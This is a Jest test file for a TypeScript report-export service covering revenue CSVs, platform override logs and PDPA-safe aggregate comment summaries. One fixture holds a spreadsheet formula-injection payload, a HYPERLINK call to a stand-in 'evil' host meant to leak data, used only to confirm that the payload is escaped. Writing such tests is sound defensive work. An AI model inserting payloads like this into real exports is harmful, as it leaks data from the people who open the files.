import { AssetPlatform, CommentPriority, ContentPillar, Sentiment } from '@prisma/client';
import { PrismaService } from '../prisma/prisma.service';
import { ReportExportService } from './report-export.service';
import { ReportQueryDto } from './dto/report-query.dto';

/**
 * Real PII strings. These are the exact values that must NEVER appear in the
 * comment-summary export bytes — the byte-level assertion below is the guard
 * on the PDPA rule (risk R3, exit criterion #6).
 */
const RAW_AUTHOR = 'สมชาย ใจดี';
const RAW_TEXT = 'บริการแย่มาก ผิดหวังมากครับ เบอร์ผม 081-234-5678';
const RAW_AUTHOR_EXTERNAL_ID = 'facebook-user-100000123456789';
const RAW_REPLY_TEXT = 'ขออภัยครับ ทีมงานจะติดต่อกลับที่เบอร์ที่ให้ไว้';

function buildQuery(overrides: Partial<ReportQueryDto> = {}): ReportQueryDto {
  const dto = new ReportQueryDto();
  Object.assign(dto, overrides);
  return dto;
}

describe('ReportExportService', () => {
  let prisma: {
    metric: { findMany: jest.Mock };
    post: { findMany: jest.Mock };
    comment: { groupBy: jest.Mock; count: jest.Mock };
  };
  let service: ReportExportService;

  beforeEach(() => {
    prisma = {
      metric: { findMany: jest.fn().mockResolvedValue([]) },
      post: { findMany: jest.fn().mockResolvedValue([]) },
      comment: { groupBy: jest.fn().mockResolvedValue([]), count: jest.fn().mockResolvedValue(0) },
    };
    service = new ReportExportService(prisma as unknown as PrismaService);
  });

  describe('revenueCsv', () => {
    const metric = (overrides: Record<string, unknown> = {}) => ({
      postId: 'post-1',
      platform: 'facebook',
      reach: 5000,
      engagement: 250,
      revenue: 1234.5,
      source: 'api',
      collectedAt: new Date('2026-07-18T00:00:00Z'),
      post: {
        id: 'post-1',
        contentId: 'content-1',
        publishMethod: 'adapter',
        content: { title: 'Funny clip', contentPillar: ContentPillar.comedy },
      },
      ...overrides,
    });

    it('emits a header row even with no data', async () => {
      const csv = await service.revenueCsv(buildQuery());

      expect(csv.split('\r\n')[0]).toBe(
        'content_id,content_title,content_pillar,platform,post_id,publish_method,' +
          'collected_at,metric_source,reach,engagement,revenue_thb',
      );
    });

    it('renders one row per post with revenue to 2dp', async () => {
      prisma.metric.findMany.mockResolvedValue([metric()]);

      const csv = await service.revenueCsv(buildQuery());
      const [, row] = csv.split('\r\n');

      expect(row).toBe(
        'content-1,Funny clip,comedy,facebook,post-1,adapter,' +
          '2026-07-18T00:00:00.000Z,api,5000,250,1234.50',
      );
    });

    // Metrics are append-only, so summing every snapshot would multi-count.
    it('keeps only the LATEST metric reading per post', async () => {
      prisma.metric.findMany.mockResolvedValue([
        metric({ revenue: 10, collectedAt: new Date('2026-07-01T00:00:00Z') }),
        metric({ revenue: 99, collectedAt: new Date('2026-07-18T00:00:00Z') }),
      ]);

      const csv = await service.revenueCsv(buildQuery());
      const dataRows = csv.trim().split('\r\n').slice(1);

      expect(dataRows).toHaveLength(1);
      expect(dataRows[0]).toContain('99.00');
      expect(dataRows[0]).not.toContain('10.00');
    });

    it('passes the period/platform/content filters through to the query', async () => {
      await service.revenueCsv(
        buildQuery({
          from: '2026-07-01',
          to: '2026-07-31',
          platform: AssetPlatform.tiktok,
          contentId: 'content-9',
        }),
      );

      const [args] = prisma.metric.findMany.mock.calls[0] as [{ where: Record<string, never> }];
      expect(args.where).toMatchObject({
        platform: 'tiktok',
        post: { contentId: 'content-9' },
        collectedAt: { gte: new Date('2026-07-01'), lte: new Date('2026-07-31') },
      });
    });
  });

  describe('overrideLogCsv', () => {
    it('renders the recommended-vs-selected decision with its reason', async () => {
      prisma.post.findMany.mockResolvedValue([
        {
          id: 'post-1',
          contentId: 'content-1',
          content: { title: 'Funny clip', contentPillar: ContentPillar.comedy },
          recommendedPlatform: AssetPlatform.facebook,
          selectedPlatform: AssetPlatform.tiktok,
          wasOverride: true,
          overrideReason: 'Audience skews younger',
          publishMethod: 'manual_external',
          status: 'posted',
          priorityScore: 0.61,
          recommendedAt: new Date('2026-07-18T00:00:00Z'),
          postedAt: new Date('2026-07-19T00:00:00Z'),
          createdAt: new Date('2026-07-19T00:00:00Z'),
        },
      ]);

      const csv = await service.overrideLogCsv(buildQuery());
      const [, row] = csv.split('\r\n');

      expect(row).toContain('facebook,tiktok,true,Audience skews younger,manual_external,posted');
    });

    it('only exports decisions that actually carried a recommendation', async () => {
      await service.overrideLogCsv(buildQuery());

      const [args] = prisma.post.findMany.mock.calls[0] as [{ where: Record<string, unknown> }];
      expect(args.where.recommendedPlatform).toEqual({ not: null });
    });

    it('escapes an override reason that would otherwise be a spreadsheet formula', async () => {
      prisma.post.findMany.mockResolvedValue([
        {
          id: 'post-1',
          contentId: 'content-1',
          content: { title: 'x', contentPillar: null },
          recommendedPlatform: AssetPlatform.facebook,
          selectedPlatform: AssetPlatform.facebook,
          wasOverride: false,
          overrideReason: '=HYPERLINK("http://evil/?leak")',
          publishMethod: 'adapter',
          status: 'posted',
          priorityScore: null,
          recommendedAt: null,
          postedAt: null,
          createdAt: new Date('2026-07-19T00:00:00Z'),
        },
      ]);

      const csv = await service.overrideLogCsv(buildQuery());

      expect(csv).toContain('"\'=HYPERLINK(""http://evil/?leak"")"');
      expect(csv).not.toMatch(/,=HYPERLINK/);
    });
  });

  describe('commentSummaryCsv — aggregate only (PDPA)', () => {
    beforeEach(() => {
      prisma.comment.groupBy.mockResolvedValue([
        {
          platform: 'facebook',
          sentiment: Sentiment.negative,
          priority: CommentPriority.complaint,
          _count: { _all: 7 },
        },
        {
          platform: 'youtube',
          sentiment: Sentiment.positive,
          priority: CommentPriority.general,
          _count: { _all: 3 },
        },
      ]);
      prisma.comment.count.mockResolvedValue(2);
    });

    it('renders counts grouped by platform/sentiment/priority', async () => {
      const csv = await service.commentSummaryCsv(buildQuery());
      const lines = csv.trim().split('\r\n');

      expect(lines[0]).toBe(
        'platform,sentiment,priority,comment_count,replied_count,sla_breached_count',
      );
      expect(lines[1]).toBe('facebook,negative,complaint,7,2,2');
      expect(lines[2]).toBe('youtube,positive,general,3,2,2');
    });

    /**
     * THE PDPA GUARD (risk R3, exit criterion #6).
     *
     * Asserted two ways, because they fail for different reasons:
     * 1. the output BYTES contain none of the raw author/text/reply values;
     * 2. the query never even SELECTS those columns — so a future refactor
     *    that starts rendering "everything the query returned" still cannot
     *    leak, because the values were never fetched.
     */
    it('leaks ZERO raw author, text, author id, or reply text into the CSV bytes', async () => {
      const csv = await service.commentSummaryCsv(buildQuery());

      expect(csv).not.toContain(RAW_AUTHOR);
      expect(csv).not.toContain(RAW_TEXT);
      expect(csv).not.toContain(RAW_AUTHOR_EXTERNAL_ID);
      expect(csv).not.toContain(RAW_REPLY_TEXT);
      // Not even the column names — there is no per-person column at all.
      for (const column of ['author', 'text', 'reply_text', 'author_external_id']) {
        expect(csv).not.toContain(column);
      }
    });

    it('never asks the database for a per-person column', async () => {
      await service.commentSummaryCsv(buildQuery());

      const [args] = prisma.comment.groupBy.mock.calls[0] as [{ by: string[] }];
      expect(args.by).toEqual(['platform', 'sentiment', 'priority']);
      for (const forbidden of ['author', 'text', 'authorExternalId', 'replyText']) {
        expect(args.by).not.toContain(forbidden);
      }
    });

    it('applies the platform/content/date filters to the aggregation', async () => {
      await service.commentSummaryCsv(
        buildQuery({ platform: AssetPlatform.line_oa, from: '2026-07-01' }),
      );

      const [args] = prisma.comment.groupBy.mock.calls[0] as [{ where: Record<string, unknown> }];
      // line_oa bridges onto the Post/Comment platform enum value "line".
      expect(args.where).toMatchObject({
        platform: 'line',
        collectedAt: { gte: new Date('2026-07-01') },
      });
    });
  });
});
